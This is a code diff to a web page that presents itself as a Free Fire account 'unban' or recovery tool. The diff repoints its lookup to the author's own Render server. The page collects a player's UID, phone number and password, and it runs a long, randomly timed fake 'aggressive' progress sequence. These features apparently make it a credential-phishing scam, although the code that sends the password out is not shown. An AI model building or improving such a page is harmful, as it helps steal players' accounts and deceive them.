@@ -1213,10 +1213,11 @@
     }, 15000);
 
     // =============================================================
-    // ===== FREE API INTEGRATION (NO PAYMENT, NO API KEY) =====
-    // Uses jinix6/free-ff-api - Open source community API
+    // ===== BACKEND SERVER INTEGRATION =====
+    // Uses your own Render server: https://ff-unban-port.onrender.com
     // =============================================================
-    const API_URL = 'https://free-ff-api-src-5plp.onrender.com/api/v1/playerstats';
+    // UPDATE YOUR API URL HERE:
+    const API_URL = 'https://ff-unban-port.onrender.com/api/player-info';
 
     // ===== MAIN LOGIC =====
     const uidInput = document.getElementById('uidInput');
@@ -1245,20 +1246,18 @@
     const accRegion = document.getElementById('accRegion');
     const accountInfo = document.getElementById('accountInfo');
 
-    // ===== FETCH REAL PLAYER DATA (FREE, NO KEY) =====
+    // ===== FETCH REAL PLAYER DATA FROM YOUR RENDER SERVER =====
     async function fetchPlayerData(uid) {
         try {
-            // Change region code: IND, BR, SG, ID, US, PK, BD, TH, VN, TW, etc.
-            const region = 'IND'; // <-- CHANGE THIS to user's region
-            const url = `${API_URL}?region=${region}&uid=${uid}`;
+            const url = `${API_URL}?uid=${uid}`;
+            console.log('Fetching from server:', url);
             
-            console.log('Fetching:', url);
             const response = await fetch(url);
             
             if (!response.ok) {
                 const errorText = await response.text();
-                console.error('API Error:', response.status, errorText);
-                throw new Error('Invalid UID or region');
+                console.error('Server Error:', response.status, errorText);
+                throw new Error('Invalid account information');
             }
             
             const data = await response.json();
@@ -1278,31 +1277,28 @@
         recoverBtn.disabled = !(uid.length >= 5 && phone.length >= 5 && pass.length >= 3);
     }
 
-    // ===== UID INPUT WITH REAL API =====
+    // ===== UID INPUT WITH YOUR SERVER =====
     uidInput.addEventListener('input', async function() {
         const uid = this.value.trim();
         
         if (uid.length >= 5) {
-            // Show loading state
             accountInfo.style.display = 'block';
-            accName.textContent = '⏳ Fetching...';
-            accLevel.textContent = '⏳ Fetching...';
-            accRegion.textContent = '⏳ Fetching...';
+            accName.textContent = '⏳ Checking...';
+            accLevel.textContent = '⏳ Checking...';
+            accRegion.textContent = '⏳ Checking...';
             accName.style.color = '#8a9bb0';
             
             const data = await fetchPlayerData(uid);
             
-            // Check if we got valid data
             if (data && data.nickname) {
                 accName.textContent = data.nickname || 'Unknown';
                 accName.style.color = '#5cdb9e';
                 accLevel.textContent = 'Level ' + (data.level || '?');
-                accRegion.textContent = data.region || 'Unknown';
+                accRegion.textContent = data.region || 'IND';
                 
                 window.realPlayerData = data;
                 recoverBtn.disabled = false;
             } else {
-                // Show error
                 accName.textContent = '❌ Invalid UID';
                 accName.style.color = '#e74c3c';
                 accLevel.textContent = 'Please check and try again.';
@@ -1404,7 +1400,6 @@
             }, 10);
 
             stageIndex++;
-            // Extended to 40+ seconds (3.5-6 seconds per stage)
             const delay = stageIndex === aggressiveStages.length ? 800 : 3500 + Math.random() * 2500;
             setTimeout(runAggressiveStage, delay);
         }
@@ -1447,4 +1442,4 @@
 </script>
 
 </body>
-</html>
+</html>>
